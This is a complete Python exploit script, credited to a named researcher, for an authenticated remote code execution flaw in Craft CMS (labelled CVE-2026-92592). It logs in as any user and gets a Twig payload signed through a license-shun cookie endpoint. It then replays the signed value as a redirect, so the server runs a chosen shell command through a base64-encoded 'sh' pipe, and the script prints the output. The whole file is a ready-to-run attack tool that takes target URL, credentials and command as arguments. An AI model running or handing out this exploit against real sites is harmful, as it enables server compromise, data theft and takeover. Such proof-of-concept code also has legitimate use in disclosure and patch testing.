#!/usr/bin/env python3
"""Craft CMS authenticated RCE via signed-cookie/redirect confusion (CVE-2026-92592).

Any account that can log in signs a Twig payload through the license-shun cookie
endpoint (Yii signs the cookie with the same securityKey used to validate signed
redirect params), then replays the signed envelope as `redirect` on its own session.
Craft renders it as unsandboxed Twig against the User, so map('system') runs a
command. Fixed in Craft 5.10.13 / 4.18.6 (GHSA-5r92-75j8-c534).
"""

import argparse
import base64
import secrets
import os
import sys
import urllib.parse

import requests

# --- self-contained terminal UI ---
_BANNER = r"""
  ____ ____      _    _____ _____
 / ___|  _ \    / \  |  ___|_   _|
| |   | |_) |  / _ \ | |_    | |
| |___|  _ <  / ___ \|  _|   | |
 \____|_| \_\/_/   \_\_|     |_|
"""
_COLOR = sys.stderr.isatty() and os.environ.get("NO_COLOR") is None


def _paint(code, text):
    return f"\033[{code}m{text}\033[0m" if _COLOR else text


def disable_color():
    global _COLOR
    _COLOR = False


def banner(subtitle):
    sys.stderr.write(_paint("36", _BANNER.strip("\n")) + "\n")
    sys.stderr.write("  " + _paint("2", subtitle) + "\n")
    sys.stderr.write("  " + _paint("2", "discovered by CryptoCat · cryptocat.me") + "\n\n")


def info(msg):
    sys.stderr.write(f" {_paint('36', '[*]')} {msg}\n")


def good(msg):
    sys.stderr.write(f" {_paint('32', '[+]')} {msg}\n")


def warn(msg):
    sys.stderr.write(f" {_paint('33', '[!]')} {msg}\n")


def bad(msg):
    sys.stderr.write(f" {_paint('31', '[-]')} {msg}\n")


def die(msg):
    bad(msg)
    sys.exit(1)


def output(data, label="command output"):
    good(label)
    sys.stderr.write(_paint("2", "  " + "-" * 60) + "\n")
    if isinstance(data, str):
        data = data.encode()
    sys.stdout.buffer.write(data)
    if data and not data.endswith(b"\n"):
        sys.stdout.buffer.write(b"\n")
    sys.stdout.buffer.flush()
# --- end terminal UI ---


def action(url, trigger, route):
    trigger = urllib.parse.quote(trigger.strip("/"), safe="")
    return f"{url.rstrip('/')}/index.php?p={trigger}/{urllib.parse.quote(route, safe='/')}"


def csrf(s, url, trigger):
    return s.get(action(url, trigger, "users/session-info"), timeout=30).json()["csrfTokenValue"]


def twig(command, start, end):
    blob = base64.b64encode(f"printf %s {start}; {command}; printf %s {end}".encode()).decode()
    return "{{ ['printf %s " + blob + " | base64 -d | sh']|map('system')|join }}"


def main():
    ap = argparse.ArgumentParser(
        description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="example:\n  %(prog)s --url https://target.example --username editor --password 'pass' --command id\n")
    ap.add_argument("--url", required=True, metavar="URL", help="Craft base URL")
    ap.add_argument("--username", required=True, metavar="USER")
    ap.add_argument("--password", required=True, metavar="PASS")
    ap.add_argument("--command", default="id", metavar="CMD", help="command to run (default: id)")
    ap.add_argument("--trigger", default="actions", metavar="T", help="action trigger (default: actions)")
    ap.add_argument("--insecure", action="store_true", help="skip TLS verification")
    ap.add_argument("--no-color", action="store_true", help="disable coloured output")
    args = ap.parse_args()
    if args.no_color:
        disable_color()

    banner("authenticated signed-cookie/redirect RCE  ·  CVE-2026-92592")

    s = requests.Session()
    s.verify = not args.insecure
    s.headers["Accept"] = "application/json"
    if args.insecure:
        requests.packages.urllib3.disable_warnings()

    login = {"loginName": args.username, "password": args.password}
    info(f"Authenticating as {args.username}")
    token = csrf(s, args.url, args.trigger)
    who = s.post(action(args.url, args.trigger, "users/login"),
                 data=login, headers={"X-CSRF-Token": token}, timeout=30).json().get("user")
    if not isinstance(who, dict):
        die("authentication failed")
    good(f"Session established as user {who.get('id')}")

    nonce = secrets.token_hex(8)
    start, end = f"S{nonce}", f"E{nonce}"
    token = csrf(s, args.url, args.trigger)
    info("Signing Twig payload through the license-shun cookie endpoint")
    signer = s.post(action(args.url, args.trigger, "app/set-license-shun-cookie"),
                    data={"hash": twig(args.command, start, end)},
                    headers={"X-CSRF-Token": token}, timeout=30)
    cookies = [c for c in signer.cookies if c.name.endswith("_license_shun")]
    if len(cookies) != 1:
        die("did not receive a signed license-shun cookie")
    envelope = urllib.parse.unquote(cookies[0].value)
    good(f"Server-signed envelope obtained ({len(envelope)} bytes)")
    for c in list(s.cookies):
        if c.name == cookies[0].name:
            s.cookies.clear(c.domain, c.path, c.name)

    info("Replaying the envelope as redirect (X-Http-Method-Override: GET)")
    r = s.post(action(args.url, args.trigger, "users/login"),
               data={"redirect": envelope},
               headers={"X-CSRF-Token": token, "X-Http-Method-Override": "GET"}, timeout=30)
    rendered = r.json().get("redirect", "")
    a = rendered.find(start)
    b = rendered.find(end, a + len(start))
    if a == -1 or b == -1:
        die(f"no command output returned (HTTP {r.status_code})")
    output(rendered[a + len(start):b])


if __name__ == "__main__":
    try:
        main()
    except requests.RequestException as e:
        die(f"request failed: {e}")
    except KeyboardInterrupt:
        sys.exit(130)
